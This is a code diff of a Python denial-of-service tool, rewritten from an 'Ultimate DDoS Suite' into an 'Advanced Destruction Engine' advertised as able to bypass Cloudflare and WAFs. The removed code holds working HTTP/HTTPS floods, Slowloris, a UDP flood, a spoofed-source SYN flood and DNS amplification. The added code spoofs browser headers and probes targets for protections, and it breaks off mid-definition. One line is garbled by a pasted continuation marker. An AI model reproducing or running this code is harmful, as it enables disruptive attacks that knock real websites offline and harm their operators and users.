@@ -1,766 +1,1459 @@
 #!/usr/bin/env python3
 """
-╔══════════════════════════════════════════════════════════════╗
-║  ██╗  ██╗██████╗ ██████╗  ██████╗  ██████╗ ██████╗ ███████╗  ║
-║  ╚██╗██╔╝██╔══██╗██╔══██╗██╔═══██╗██╔═══██╗██╔══██╗██╔════╝  ║
-║   ╚███╔╝ ██████╔╝██████╔╝██║   ██║██║   ██║██████╔╝███████╗  ║
-║   ██╔██╗ ██╔═══╝ ██╔══██╗██║   ██║██║   ██║██╔══██╗╚════██║  ║
-║  ██╔╝ ██╗██║     ██║  ██║╚██████╔╝╚██████╔╝██║  ██║███████║  ║
-║  ╚═╝  ╚═╝╚═╝     ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚═╝  ╚═╝╚══════╝  ║
-║                  ULTIMATE DDOS SUITE v4.0                     ║
-║              Multi-Vector Attack Framework                    ║
-╚══════════════════════════════════════════════════════════════╝
+██████╗ ██████╗  █████╗  ██████╗██╗  ██╗ █████╗ ██████╗ 
+██╔══██╗██╔══██╗██╔══██╗██╔════╝██║ ██╔╝██╔══██╗██╔══██╗
+██████╔╝██████╔╝███████║██║     █████╔╝ ███████║██████╔╝
+██╔══██╗██╔══██╗██╔══██║██║     ██╔═██╗ ██╔══██║██╔══██╗
+██████╔╝██║  ██║██║  ██║╚██████╗██║  ██╗██║  ██║██║  ██║
+╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝
+                ADVANCED DESTRUCTION ENGINE v6.0
+                CLOUDFLARE/WAF BYPASS EDITION
 """
 
 import os
 import sys
 import time
 import random
-import socket
 import threading
+import socket
+import asyncio
+import aiohttp
 import ssl
-import argparse
-import re
+import urllib.parse
 import json
-import hashlib
-import struct
-import select
+import warnings
+import urllib3
 from datetime import datetime
-from queue import Queue
-from concurrent.futures import ThreadPoolExecutor, as_completed
-from colorama import init, Fore, Back, Style
-import requests
-from urllib.parse import urlparse
-import dns.resolver
-import ipaddress
 
-# Initialize colorama
-init(autoreset=True)
+# Disable all warnings
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+warnings.filterwarnings("ignore")
 
-class XPROUltimateBanner:
-    @staticmethod
-    def show():
-        banner = f"""
-{Fore.RED}╔══════════════════════════════════════════════════════════════════════════════════╗
-{Fore.RED}║                                                                                  ║
-{Fore.RED}║   {Fore.CYAN}██╗  ██╗{Fore.YELLOW}██████╗ {Fore.GREEN}█████╗  {Fore.MAGENTA}██████╗  {Fore.WHITE}██████╗  {Fore.CYAN}██████╗ {Fore.YELLOW}███████╗{Fore.RED}║
-{Fore.RED}║   {Fore.CYAN}╚██╗██╔╝{Fore.YELLOW}██╔══██╗{Fore.GREEN}██╔══██╗{Fore.MAGENTA}██╔═══██╗{Fore.WHITE}██╔══██╗{Fore.CYAN}██╔═══██╗{Fore.YELLOW}██╔════╝{Fore.RED}║
-{Fore.RED}║    {Fore.CYAN}╚███╔╝ {Fore.YELLOW}██████╔╝{Fore.GREEN}███████║{Fore.MAGENTA}██║   ██║{Fore.WHITE}██████╔╝{Fore.CYAN}██║   ██║{Fore.YELLOW}███████╗{Fore.RED}║
-{Fore.RED}║    {Fore.CYAN}██╔██╗ {Fore.YELLOW}██╔═══╝ {Fore.GREEN}██╔══██║{Fore.MAGENTA}██║   ██║{Fore.WHITE}██╔══██╗{Fore.CYAN}██║   ██║{Fore.YELLOW}╚════██║{Fore.RED}║
-{Fore.RED}║   {Fore.CYAN}██╔╝ ██╗{Fore.YELLOW}██║     {Fore.GREEN}██║  ██║{Fore.MAGENTA}╚██████╔╝{Fore.WHITE}██║  ██║{Fore.CYAN}╚██████╔╝{Fore.YELLOW}███████║{Fore.RED}║
-{Fore.RED}║   {Fore.CYAN}╚═╝  ╚═╝{Fore.YELLOW}╚═╝     {Fore.GREEN}╚═╝  ╚═╝{Fore.MAGENTA} ╚═════╝ {Fore.WHITE}╚═╝  ╚═╝{Fore.CYAN} ╚═════╝ {Fore.YELLOW}╚══════╝{Fore.RED}║
-{Fore.RED}║                                                                                  ║
-{Fore.RED}║              {Fore.WHITE}ULTIMATE DDOS SUITE v4.0 - MULTI-VECTOR ATTACK          {Fore.RED}║
-{Fore.RED}║                {Fore.YELLOW}Professional Security Testing Framework              {Fore.RED}║
-{Fore.RED}╚══════════════════════════════════════════════════════════════════════════════════╝
-{Style.RESET_ALL}
-"""
-        print(banner)
+# Rich imports
+from rich.console import Console
+from rich.panel import Panel
+from rich.text import Text
+from rich.table import Table
+from rich.live import Live
+from rich.layout import Layout
+from rich.columns import Columns
+from rich.progress import Progress, SpinnerColumn, BarColumn, TextColumn
+from rich.status import Status
+from rich.syntax import Syntax
+from rich import box
+import colorama
 
-class AttackManager:
-    def __init__(self):
-        self.attacks = {}
-        self.stats = {
-            'total_requests': 0,
-            'successful_connections': 0,
-            'failed_connections': 0,
-            'bandwidth_used': 0,
-            'start_time': None,
-            'active_threads': 0
+# Initialize
+colorama.init(autoreset=True)
+console = Console()
+
+# SSL context for ignoring certificate warnings
+ssl_context = ssl.create_default_context()
+ssl_context.check_hostname = False
+ssl_context.verify_mode = ssl.CERT_NONE
+
+# ==================== GLOBAL CONFIGURATION ====================
+class Config:
+    # Performance
+    MAX_THREADS = 500
+    MAX_RPS = 2000  # Reduced for WAF bypass
+    CONNECTION_TIMEOUT = 15
+    REQUEST_TIMEOUT = 20
+    
+    # Attack
+    ATTACK_DURATION = 1800  # 30 minutes
+    AUTO_RESTART = True
+    STEALTH_MODE = False
+    
+    # Network
+    USE_PROXY = False
+    PROXY_LIST = []
+    ROTATE_USER_AGENT = True
+    ROTATE_IP = False
+    
+    # WAF Bypass
+    ENABLE_WAF_BYPASS = True
+    ADAPTIVE_ATTACK = True
+    HUMAN_LIKE_DELAYS = True
+    
+    # Monitoring
+    LOG_LEVEL = "INFO"
+    SAVE_STATS = True
+    
+    @classmethod
+    def update(cls, **kwargs):
+        for key, value in kwargs.items():
+            if hasattr(cls, key):
+                setattr(cls, key, value)
+
+# Global state
+class AttackState:
+    attacking = False
+    start_time = 0
+    stats = {
+        'total_requests': 0,
+        'successful': 0,
+        'blocked': 0,
+        'errors': 0,
+        'bytes_sent': 0,
+        'bytes_received': 0,
+        'peak_rps': 0,
+        'current_rps': 0,
+        'targets_hit': 0,
+        'unique_ips': set(),
+        'waf_detected': False,
+        'cloudflare_detected': False
+    }
+    lock = threading.Lock()
+    last_count = 0
+
+# ==================== USER AGENTS & HEADERS ====================
+BROWSER_SIGNATURES = [
+    # Chrome Windows
+    {
+        'user_agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'headers': {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1',
+            'Upgrade-Insecure-Requests': '1',
+            'DNT': '1'
         }
-        self.lock = threading.Lock()
-        self.running = False
-        
-    def update_stats(self, key, value=1):
-        with self.lock:
-            if key in self.stats:
-                self.stats[key] += value
-
-class UltimateAttack:
-    def __init__(self, target, port=80, threads=500, duration=60):
-        self.target = target
-        self.port = port
-        self.threads = threads
-        self.duration = duration
-        self.running = False
-        self.manager = AttackManager()
-        
-        # Enhanced user agents
-        self.user_agents = self.load_user_agents()
-        
-        # Attack methods configuration
-        self.attack_methods = {
-            'http': self.http_flood,
-            'https': self.https_flood,
-            'slowloris': self.slowloris,
-            'udp': self.udp_flood,
-            'tcp': self.tcp_syn_flood,
-            'dns': self.dns_amplification,
-            'mixed': self.mixed_attack
+    },
+    # Firefox Linux
+    {
+        'user_agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/121.0',
+        'headers': {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.5',
+            'Cache-Control': 'max-age=0',
+            'DNT': '1',
+            'Upgrade-Insecure-Requests': '1'
         }
-        
-    def load_user_agents(self):
-        """Load comprehensive user agents list"""
-        return [
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (iPad; CPU OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-            "Mozilla/5.0 (Android 14; Mobile; rv:120.0) Gecko/120.0 Firefox/120.0"
-        ]
-    
-    def create_socket_with_retry(self, socket_type=socket.AF_INET, sock_type=socket.SOCK_STREAM):
-        """Create socket with error handling"""
-        try:
-            sock = socket.socket(socket_type, sock_type)
-            sock.settimeout(10)
-            return sock
-        except Exception as e:
-            self.manager.update_stats('failed_connections')
-            return None
-    
-    def http_flood(self):
-        """Advanced HTTP Flood with retry logic"""
-        while self.running:
-            sock = self.create_socket_with_retry()
-            if not sock:
-                time.sleep(0.1)
-                continue
-            
-            try:
-                # Connect with timeout
-                sock.settimeout(5)
-                sock.connect((self.target, self.port))
-                self.manager.update_stats('successful_connections')
-                
-                # Send multiple requests
-                for _ in range(random.randint(10, 50)):
-                    if not self.running:
-                        break
-                    
-                    try:
-                        payload = self.generate_http_payload()
-                        sock.sendall(payload)
-                        self.manager.update_stats('total_requests')
-                        self.manager.update_stats('bandwidth_used', len(payload))
-                        time.sleep(random.uniform(0.01, 0.1))
-                    except:
-                        break
-                
-                sock.close()
-                
-            except socket.timeout:
-                self.manager.update_stats('failed_connections')
-            except ConnectionRefusedError:
-                self.manager.update_stats('failed_connections')
-                time.sleep(0.5)
-            except Exception as e:
-                self.manager.update_stats('failed_connections')
-            finally:
-                try:
-                    sock.close()
-                except:
-                    pass
-    
-    def https_flood(self):
-        """HTTPS/SSL Flood Attack"""
-        context = ssl.create_default_context()
-        context.check_hostname = False
-        context.verify_mode = ssl.CERT_NONE
-        
-        while self.running:
-            try:
-                # Create raw socket
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(5)
-                sock.connect((self.target, self.port))
-                
-                # Wrap with SSL
-                ssl_sock = context.wrap_socket(sock, server_hostname=self.target)
-                
-                # Send HTTPS requests
-                for _ in range(random.randint(5, 20)):
-                    if not self.running:
-                        break
-                    
-                    try:
-                        payload = self.generate_http_payload()
-                        ssl_sock.sendall(payload)
-                        self.manager.update_stats('total_requests')
-                        self.manager.update_stats('bandwidth_used', len(payload))
-                    except:
-                        break
-                
-                ssl_sock.close()
-                self.manager.update_stats('successful_connections')
-                
-            except Exception as e:
-                self.manager.update_stats('failed_connections')
-                time.sleep(0.1)
-    
-    def slowloris(self):
-        """Advanced Slowloris with keep-alive"""
-        sockets_pool = []
-        
-        while self.running:
-            try:
-                # Maintain pool of 200 sockets
-                while len(sockets_pool) < 200 and self.running:
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                        sock.settimeout(4)
-                        sock.connect((self.target, self.port))
-                        
-                        # Send partial request
-                        sock.send(f"GET /?{random.randint(1, 9999)} HTTP/1.1\r\n".encode())
-                        sock.send(f"Host: {self.target}\r\n".encode())
-                        sock.send("User-Agent: {}\r\n".format(random.choice(self.user_agents)).encode())
-                        sock.send("Accept: text/html,application/xhtml+xml\r\n".encode())
-                        sock.send("X-a: ".encode())
-                        
-                        sockets_pool.append(sock)
-                        self.manager.update_stats('successful_connections')
-                    except:
-                        pass
-                
-                # Keep connections alive
-                for sock in sockets_pool[:]:
-                    try:
-                        sock.send(f"X-b: {random.randint(1, 9999)}\r\n".encode())
-                        self.manager.update_stats('total_requests')
-                    except:
-                        sockets_pool.remove(sock)
-                        self.manager.update_stats('failed_connections')
-                
-                time.sleep(random.randint(10, 20))
-                
-            except Exception:
-                pass
-    
-    def udp_flood(self):
-        """UDP Flood with random ports and data"""
-        while self.running:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                sock.settimeout(1)
-                
-                # Generate random data
-                data_size = random.randint(64, 1500)
-                data = os.urandom(data_size)
-                
-                # Send to multiple random ports
-                for _ in range(random.randint(10, 100)):
-                    if not self.running:
-                        break
-                    
-                    try:
-                        target_port = random.randint(1, 65535)
-                        sock.sendto(data, (self.target, target_port))
-                        self.manager.update_stats('total_requests')
-                        self.manager.update_stats('bandwidth_used', data_size)
-                    except:
-                        break
-                
-                sock.close()
-                
-            except Exception:
-                self.manager.update_stats('failed_connections')
-                time.sleep(0.01)
-    
-    def tcp_syn_flood(self):
-        """TCP SYN Flood (requires raw socket privileges)"""
-        try:
-            # Try raw socket (requires root/admin)
-            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
-            
-            while self.running:
-                try:
-                    # Craft TCP SYN packet
-                    packet = self.craft_tcp_syn_packet()
-                    sock.sendto(packet, (self.target, self.port))
-                    self.manager.update_stats('total_requests')
-                    self.manager.update_stats('bandwidth_used', len(packet))
-                except:
-                    break
-                    
-        except PermissionError:
-            # Fallback to normal SYN flood simulation
-            print(f"{Fore.YELLOW}[!] Raw socket access denied. Using simulated SYN flood.{Style.RESET_ALL}")
-            self.simulated_syn_flood()
-    
-    def simulated_syn_flood(self):
-        """Simulated SYN flood for non-privileged users"""
-        while self.running:
-            try:
-                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-                sock.settimeout(0.5)
-                sock.connect((self.target, self.port))
-                sock.close()
-                self.manager.update_stats('total_requests')
-                self.manager.update_stats('successful_connections')
-            except:
-                self.manager.update_stats('failed_connections')
-                time.sleep(0.01)
-    
-    def dns_amplification(self):
-        """DNS Amplification Attack"""
-        # List of open DNS resolvers (for educational purposes)
-        dns_servers = [
-            '8.8.8.8',      # Google DNS
-            '1.1.1.1',      # Cloudflare
-            '9.9.9.9',      # Quad9
-        ]
-        
-        while self.running:
-            try:
-                # Create DNS query for amplification
-                query = self.create_dns_query()
-                
-                for dns_server in dns_servers:
-                    if not self.running:
-                        break
-                    
-                    try:
-                        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                        sock.settimeout(2)
-                        sock.sendto(query, (dns_server, 53))
-                        
-                        # Try to receive response (amplification)
-                        try:
-                            response, _ = sock.recvfrom(4096)
-                            self.manager.update_stats('bandwidth_used', len(response))
-                        except socket.timeout:
-                            pass
-                        
-                        sock.close()
-                        self.manager.update_stats('total_requests')
-                        
-                    except:
-                        pass
-                    
-                    time.sleep(0.01)
-                    
-            except Exception:
-                self.manager.update_stats('failed_connections')
-    
-    def mixed_attack(self):
-        """Mixed attack - runs all methods simultaneously"""
-        methods = ['http', 'slowloris', 'udp']
-        
-        with ThreadPoolExecutor(max_workers=len(methods)) as executor:
-            futures = []
-            for method in methods:
-                if method == 'http':
-                    futures.append(executor.submit(self.http_flood))
-                elif method == 'slowloris':
-                    futures.append(executor.submit(self.slowloris))
-                elif method == 'udp':
-                    futures.append(executor.submit(self.udp_flood))
-            
-            # Wait for all to complete or duration timeout
-            start_time = time.time()
-            while time.time() - start_time < self.duration and self.running:
-                time.sleep(1)
-            
-            self.running = False
-            
-            # Cancel remaining futures
-            for future in futures:
-                future.cancel()
-    
-    def generate_http_payload(self):
-        """Generate sophisticated HTTP payload"""
-        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPT**CONTINUATION OF ULTIMATE main.py:**
-        methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD', 'TRACE', 'CONNECT']
-        paths = [
-            '/', '/index.php', '/wp-admin', '/admin', '/login', '/api/v1',
-            '/search', '/product', '/user', '/dashboard', '/config',
-            '/test', '/debug', '/phpinfo.php', '/.env', '/wp-config.php'
-        ]
-        
-        method = random.choice(methods)
-        path = random.choice(paths)
-        params = f"?id={random.randint(1, 99999)}&token={hashlib.md5(str(random.random()).encode()).hexdigest()[:16]}"
-        
-        # Build comprehensive HTTP request
-        request_lines = [
-            f"{method} {path}{params} HTTP/1.1",
-            f"Host: {self.target}",
-            f"User-Agent: {random.choice(self.user_agents)}",
-            "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
-            "Accept-Language: en-US,en;q=0.9",
-            "Accept-Encoding: gzip, deflate, br",
-            "Connection: keep-alive",
-            "Upgrade-Insecure-Requests: 1",
-            "Cache-Control: max-age=0",
-            f"X-Forwarded-For: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-            f"X-Real-IP: {random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
-            "X-Requested-With: XMLHttpRequest",
-            f"Referer: https://{random.choice(['google.com', 'facebook.com', 'twitter.com'])}/",
-        ]
-        
-        if method in ['POST', 'PUT', 'PATCH']:
-            content = f"data={os.urandom(random.randint(100, 5000)).hex()}"
-            request_lines.append("Content-Type: application/x-www-form-urlencoded")
-            request_lines.append(f"Content-Length: {len(content)}")
-            request_lines.append("")
-            request_lines.append(content)
-        else:
-            request_lines.append("")
-        
-        return "\r\n".join(request_lines).encode()
-    
-    def craft_tcp_syn_packet(self):
-        """Craft TCP SYN packet for raw socket"""
-        # IP header
-        ip_ihl = 5
-        ip_ver = 4
-        ip_tos = 0
-        ip_tot_len = 0
-        ip_id = random.randint(1, 65535)
-        ip_frag_off = 0
-        ip_ttl = 255
-        ip_proto = socket.IPPROTO_TCP
-        ip_check = 0
-        ip_saddr = socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
-        ip_daddr = socket.inet_aton(self.target)
-        
-        ip_ihl_ver = (ip_ver << 4) + ip_ihl
-        
-        # TCP header
-        tcp_source = random.randint(1024, 65535)
-        tcp_dest = self.port
-        tcp_seq = random.randint(0, 4294967295)
-        tcp_ack_seq = 0
-        tcp_doff = 5
-        tcp_fin = 0
-        tcp_syn = 1
-        tcp_rst = 0
-        tcp_psh = 0
-        tcp_ack = 0
-        tcp_urg = 0
-        tcp_window = socket.htons(5840)
-        tcp_check = 0
-        tcp_urg_ptr = 0
-        
-        tcp_offset_res = (tcp_doff << 4) + 0
-        tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
-        
-        # Packet construction
-        tcp_header = struct.pack('!HHLLBBHHH', tcp_source, tcp_dest, tcp_seq,
-                                tcp_ack_seq, tcp_offset_res, tcp_flags,
-                                tcp_window, tcp_check, tcp_urg_ptr)
-        
-        # Pseudo header for checksum
-        source_address = socket.inet_aton(f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}")
-        dest_address = socket.inet_aton(self.target)
-        placeholder = 0
-        protocol = socket.IPPROTO_TCP
-        tcp_length = len(tcp_header)
-        
-        psh = struct.pack('!4s4sBBH', source_address, dest_address,
-                         placeholder, protocol, tcp_length)
-        psh = psh + tcp_header
-        
-        # Simple checksum (for demonstration)
-        tcp_check = 0
-        
-        # Repack with checksum
-        tcp_header = struct.pack('!HHLLBBH', tcp_source, tcp_dest, tcp_seq,
-                                tcp_ack_seq, tcp_offset_res, tcp_flags,
-                                tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
-        
-        return tcp_header
-    
-    def create_dns_query(self):
-        """Create DNS amplification query"""
-        # DNS header
-        transaction_id = random.randint(1, 65535)
-        flags = 0x0100  # Standard query
-        questions = 1
-        answer_rrs = 0
-        authority_rrs = 0
-        additional_rrs = 0
-        
-        header = struct.pack('!HHHHHH', transaction_id, flags, questions,
-                           answer_rrs, authority_rrs, additional_rrs)
-        
-        # Query for ANY record (amplification)
-        query = b'\x00\x00\x01\x00\x01'
-        
-        return header + query
-    
-    def show_real_time_stats(self):
-        """Display enhanced real-time statistics"""
-        start_time = self.manager.stats['start_time']
-        
-        while self.running:
-            try:
-                elapsed = time.time() - start_time
-                stats = self.manager.stats
-                
-                # Calculate metrics
-                req_per_sec = stats['total_requests'] / elapsed if elapsed > 0 else 0
-                success_rate = (stats['successful_connections'] / 
-                              (stats['successful_connections'] + stats['failed_connections']) * 100 
-                              if (stats['successful_connections'] + stats['failed_connections']) > 0 else 0)
-                
-                bandwidth_mbps = (stats['bandwidth_used'] * 8) / (elapsed * 1000000) if elapsed > 0 else 0
-                
-                # Clear line and print stats
-                sys.stdout.write('\r' + ' ' * 150 + '\r')
-                
-                print(f"{Fore.CYAN}╔{'═'*78}╗{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}║{Fore.GREEN} LIVE ATTACK STATISTICS {Fore.YELLOW}{elapsed:.1f}s {Fore.CYAN}{' '*49}║{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}╠{'═'*78}╣{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}║{Fore.WHITE} Requests: {Fore.GREEN}{stats['total_requests']:,} {Fore.WHITE}| "
-                      f"Rate: {Fore.YELLOW}{req_per_sec:.1f}/s {Fore.WHITE}| "
-                      f"Success: {Fore.GREEN}{success_rate:.1f}% {Fore.CYAN}{' '*20}║{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}║{Fore.WHITE} Connections: {Fore.GREEN}{stats['successful_connections']:,} {Fore.WHITE}| "
-                      f"Failed: {Fore.RED}{stats['failed_connections']:,} {Fore.WHITE}| "
-                      f"Bandwidth: {Fore.MAGENTA}{bandwidth_mbps:.2f} Mbps {Fore.CYAN}{' '*10}║{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}║{Fore.WHITE} Target: {Fore.YELLOW}{self.target}:{self.port} {Fore.WHITE}| "
-                      f"Threads: {Fore.CYAN}{self.threads} {Fore.WHITE}| "
-                      f"Time Left: {Fore.RED}{self.duration - elapsed:.0f}s {Fore.CYAN}{' '*15}║{Style.RESET_ALL}")
-                print(f"{Fore.CYAN}╚{'═'*78}╝{Style.RESET_ALL}")
-                
-                time.sleep(1)
-                
-            except:
-                break
-    
-    def start(self, attack_type='mixed'):
-        """Start the attack with specified type"""
-        self.running = True
-        self.manager.stats['start_time'] = time.time()
-        
-        print(f"\n{Fore.GREEN}[+] Starting {attack_type.upper()} attack on {self.target}:{self.port}{Style.RESET_ALL}")
-        print(f"{Fore.YELLOW}[+] Threads: {self.threads} | Duration: {self.duration}s{Style.RESET_ALL}")
-        print(f"{Fore.MAGENTA}[+] Press Ctrl+C to stop attack{Style.RESET_ALL}")
-        
-        # Start stats display thread
-        stats_thread = threading.Thread(target=self.show_real_time_stats)
-        stats_thread.daemon = True
-        stats_thread.start()
-        
-        # Start attack threads
-        threads = []
-        
-        if attack_type == 'mixed':
-            # Mixed attack uses its own thread pool
-            attack_thread = threading.Thread(target=self.mixed_attack)
-            attack_thread.start()
-            threads.append(attack_thread)
-        else:
-            # Single attack method
-            for i in range(self.threads):
-                thread = threading.Thread(target=self.attack_methods[attack_type])
-                thread.daemon = True
-                thread.start()
-                threads.append(thread)
-        
-        # Run for specified duration
-        try:
-            time.sleep(self.duration)
-            self.running = False
-            print(f"\n\n{Fore.GREEN}[+] Attack completed successfully!{Style.RESET_ALL}")
-        except KeyboardInterrupt:
-            self.running = False
-            print(f"\n\n{Fore.YELLOW}[!] Attack stopped by user{Style.RESET_ALL}")
-        
-        # Wait for threads to finish
-        time.sleep(2)
-        
-        # Final report
-        self.generate_report()
+    },
+    # Safari Mac
+    {
+        'user_agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15',
+        'headers': {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0'
+        }
+    },
+    # Mobile Chrome
+    {
+        'user_agent': 'Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
+        'headers': {
+            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
+            'Accept-Encoding': 'gzip, deflate, br',
+            'Accept-Language': 'en-US,en;q=0.9',
+            'Cache-Control': 'max-age=0',
+            'Sec-Ch-Ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            'Sec-Ch-Ua-Mobile': '?1',
+            'Sec-Ch-Ua-Platform': '"Android"',
+            'Sec-Fetch-Dest': 'document',
+            'Sec-Fetch-Mode': 'navigate',
+            'Sec-Fetch-Site': 'none',
+            'Sec-Fetch-User': '?1'
+        }
+    }
+]
 
-def validate_target(target):
-    """Validate and clean target input"""
-    # Remove protocol
-    target = re.sub(r'^https?://', '', target)
-    target = re.sub(r'^www\.', '', target)
-    
-    # Remove path and query parameters
-    target = target.split('/')[0]
-    
-    # Validate IP or domain
-    try:
-        # Check if it's an IP address
-        ipaddress.ip_address(target)
-        return target
-    except ValueError:
-        # It's a domain name
-        if re.match(r'^[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', target):
-            return target
-        else:
-            raise ValueError(f"Invalid target format: {target}")
+# Common referers
+REFERERS = [
+    'https://www.google.com/',
+    'https://www.bing.com/',
+    'https://duckduckgo.com/',
+    'https://www.facebook.com/',
+    'https://twitter.com/',
+    'https://www.reddit.com/',
+    'https://www.linkedin.com/',
+    'https://github.com/',
+    'https://stackoverflow.com/'
+]
 
-def resolve_target(target):
-    """Resolve domain to IP with multiple attempts"""
-    try:
-        # Try multiple DNS servers
-        dns_servers = ['8.8.8.8', '1.1.1.1', '9.9.9.9']
+# ==================== TARGET INFORMATION ====================
+class TargetInfo:
+    def __init__(self, url):
+        self.url = url
+        self.protocol = "http"
+        self.host = ""
+        self.port = 80
+        self.path = "/"
+        self.ip = ""
+        self.ssl_enabled = False
+        self.server_info = {}
+        self.technologies = []
+        self.vulnerabilities = []
+        self.protection_detected = False
+        self.protection_type = None  # 'cloudflare', 'waf', 'captcha', 'none'
         
-        for dns_server in dns_servers:
+    def parse(self):
+        """Parse target URL"""
+        try:
+            if not self.url.startswith(('http://', 'https://')):
+                self.url = 'http://' + self.url
+            
+            parsed = urllib.parse.urlparse(self.url)
+            self.protocol = parsed.scheme
+            self.host = parsed.hostname
+            self.port = parsed.port or (443 if self.protocol == 'https' else 80)
+            self.path = parsed.path or '/'
+            self.ssl_enabled = (self.protocol == 'https')
+            
+            # Get IP address
             try:
-                resolver = dns.resolver.Resolver()
-                resolver.nameservers = [dns_server]
-                answers = resolver.resolve(target, 'A')
-                return str(answers[0])
+                self.ip = socket.gethostbyname(self.host)
+                AttackState.stats['unique_ips'].add(self.ip)
             except:
-                continue
-        
-        # Fallback to socket.gethostbyname
-        return socket.gethostbyname(target)
-        
-    except Exception as e:
-        print(f"{Fore.YELLOW}[!] Could not resolve {target}: {str(e)}{Style.RESET_ALL}")
-        return target
-
-def test_connection(target, port, timeout=5):
-    """Test if target is reachable"""
-    try:
-        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        sock.settimeout(timeout)
-        result = sock.connect_ex((target, port))
-        sock.close()
-        
-        if result == 0:
-            print(f"{Fore.GREEN}[✓] Target {target}:{port} is reachable{Style.RESET_ALL}")
+                self.ip = self.host
+            
             return True
-        else:
-            print(f"{Fore.YELLOW}[!] Target {target}:{port} may be unreachable (Error: {result}){Style.RESET_ALL}")
+        except Exception as e:
+            console.print(f"[red]✗ Error parsing target: {e}[/]")
             return False
-    except Exception as e:
-        print(f"{Fore.RED}[!] Connection test failed: {str(e)}{Style.RESET_ALL}")
-        return False
-
-def main():
-    """Main function with enhanced error handling"""
-    try:
-        # Show banner
-        XPROUltimateBanner.show()
+    
+    def scan_and_detect(self):
+        """Scan target and detect protections"""
+        try:
+            import requests
+            
+            # Test request with browser-like headers
+            browser = random.choice(BROWSER_SIGNATURES)
+            headers = browser['headers'].copy()
+            headers['User-Agent'] = browser['user_agent']
+            
+            response = requests.get(self.url, headers=headers, timeout=10, verify=False)
+            self.server_info = dict(response.headers)
+            
+            # Detect technologies
+            self._detect_technologies(response)
+            
+            # Detect protections
+            self._detect_protections(response)
+            
+            # Find vulnerabilities
+            self._find_vulnerabilities()
+            
+            return True
+        except Exception as e:
+            console.print(f"[yellow]⚠️  Scan failed: {e}[/]")
+            return False
+    
+    def _detect_technologies(self, response):
